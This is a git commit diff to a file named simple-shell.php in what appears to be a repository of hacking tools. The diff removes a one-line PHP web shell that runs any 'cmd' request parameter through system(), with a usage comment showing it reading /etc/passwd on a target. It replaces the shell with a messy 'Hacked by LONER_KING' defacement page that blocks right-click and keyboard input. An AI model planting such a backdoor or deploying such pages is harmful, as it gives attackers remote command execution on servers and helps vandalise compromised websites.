5a491f5f465f5c00dc9ddf04c021e1dc56103074
LonerKing1 <144800761+LonerKing1@users.noreply.github.com>
2023-11-08 19:01:45 +0800

    Update simple-shell.php

--- shell/php/simple-shell.php
+++ shell/php/simple-shell.php
@@ -1,3 +1,91 @@
-<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
-<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
-<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
+<HTML>  
+  <HEAD> 
+  <title>Hacked by LONER_KING</title>
+<meta content='Hacked by LONER_KING' name='subject'/>
+<meta content='Hacked by LONER_KING' 
+
+name='Abstract'/>
+<meta content='Hacked by Kitsune a.k.a LONER_KING' 
+
+name='description'/>
+<meta content='i will control the world' name='copyright'/>
+<meta content='i will control the world' name='author'/>
+  <link REL="SHORTCUTICON" 
+
+HREF="http://rovicky.files.wordpress.com/2006/08/flag-indonesia.jpg?w=468"> 
+
+
+  </script>   
+<style type='text/css'>
+a:link {
+text-decoration: none;
+}
+a:visited {
+text-decoration: none;
+}
+a:hover {
+text-decoration: none;
+}
+</style>  
+  </HEAD>    
+  <link href='http://fonts.googleapis.com/css?family=Orbitron:700' 
+
+rel='stylesheet' type='text/css'>
+  
+  <body bgcolor="#000000">   
+  <body oncontextmenu='return false;' onkeydown='return false;' 
+
+onmousedown='return false;'>  
+  <style type="text/css">    <!--    a:link {color: #00FF00; 
+
+text-decoration: none; }    a:active {color: #00FF00; text-decoration: 
+
+none; }    a:visited {color: #00FF00; text-decoration: none; }    a:hover 
+
+{color: #00FF00; text-decoration: none; }    body { 
+
+background-color:black;}            -->    </style>    
+  <DIV align="right"><FONT style="FONT-SIZE: 13pt" face="Courier" 
+
+color="white"><center><br />
+  <img 
+
+<center><img src="http://www.mrconservative.com/files/2014/01/2014.01.03-mrconservative-52c7336a7aa18.jpg" width="860" height="264""><center> 
+  <p id="example2"><p align="center"><font face="Orbitron" size="7" 
+
+color="Green">Hacked By</font><font face="Orbitron" size="7" color="Green"> 
+
+./ LONER_KING </font></p><br />    </p>   
+<center><p> 
+<font face="Orbitron" color="red"> 
+<center><FONT COLOR="Red"><FONT SIZE=6>This Site Has Been Hacked.</FONT></FONT></center>
+</body>
+<center><FONT COLOR="Red"><FONT SIZE=6>No System Is Safe.</FONT></FONT></center>
+</marquee>  <br />
+<br />
+<center>    <font face="Orbitron" size="2" color="White">Islamic cyberghost
+</font><font face="Orbitron" size="2" color="white"><a 
+
+href="http://www.twitter.com/CrowID" 
+
+target="_blank"></font>  <br />
+ 
+
+  <script type="text/javascript">        //Define first typing example:     
+
+   //Define second typing example (use "slashing" cursor at the end):    
+
+new TypingText(document.getElementById("example2"), 50, function(i){ var ar 
+
+= new Array("&#9619;", "&#9619;", "", ""); return " " + ar[i.length % 
+
+ar.length]; });        //Type out examples:    TypingText.runAll();        
+
+</script>      
+<center>
+</font>
+<!-- Hacked By LONER_KING -->  
+</script>
+<font color="red" face="Chiller" size="4"><br></font>
+</HTML>
